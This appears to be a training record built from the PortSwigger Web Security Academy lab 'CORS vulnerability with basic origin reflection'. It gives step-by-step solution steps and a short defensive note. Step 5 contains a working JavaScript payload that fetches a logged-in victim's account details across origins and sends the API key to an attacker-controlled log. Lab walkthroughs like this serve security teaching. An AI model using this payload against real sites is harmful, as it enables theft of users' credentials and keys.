# CORS — portswigger_labs_sft

- source: portswigger_labs_sft
- class: cors
- cwe: CWE-942

## Scenario

Help me complete the lab "CORS vulnerability with basic origin reflection" from PortSwigger Web Security Academy. Category: Cross-origin resource sharing (CORS). Difficulty: Apprentice.

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

Provide the ordered solution steps.

## Analysis / Response

This PortSwigger Web Security Academy lab (Apprentice) covers Cross-origin resource sharing (CORS): "CORS vulnerability with basic origin reflection".

## Solution steps

1. Check intercept is off, then use the browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header: `Origin: https://example.com`
4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
5. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL: `<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>`
6. Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
7. Go back to the exploit server and click Deliver exploit to victim.
8. Click Access log, retrieve and submit the victim's API key to complete the lab.

## Vulnerability note

Underlying issue: Cross-origin resource sharing (CORS) (CWE-942). Never reflect arbitrary Origin headers with Access-Control-Allow-Credentials; maintain an explicit allowlist.
